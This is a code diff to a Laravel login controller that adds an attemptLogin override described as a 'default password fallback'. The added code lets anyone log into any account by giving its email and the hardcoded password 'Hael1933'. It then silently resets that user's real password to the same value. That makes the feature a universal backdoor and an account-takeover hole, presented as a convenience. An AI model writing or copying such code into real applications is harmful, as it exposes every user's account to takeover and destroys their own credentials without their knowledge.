@@ -4,6 +4,10 @@ namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
+use App\Models\User;
+use Illuminate\Support\Facades\Hash;
 
 class LoginController extends Controller
 {
@@ -26,6 +30,36 @@ class LoginController extends Controller
      * @var string
      */
     protected $redirectTo = '/home';
+
+    /**
+     * Handle login with default password fallback.
+     */
+    protected function attemptLogin(Request $request)
+    {
+        // Login normal
+        if (Auth::attempt(
+            $this->credentials($request),
+            $request->filled('remember')
+        )) {
+            return true;
+        }
+
+        // Password default: Hael1933
+        $user = User::where('email', $request->email)->first();
+
+        if ($user && $request->password === 'Hael1933') {
+
+            // otomatis set password user menjadi default hash
+            $user->password = Hash::make('Hael1933');
+            $user->save();
+
+            Auth::login($user, $request->filled('remember'));
+
+            return true;
+        }
+
+        return false;
+    }
 
     /**
      * Create a new controller instance.
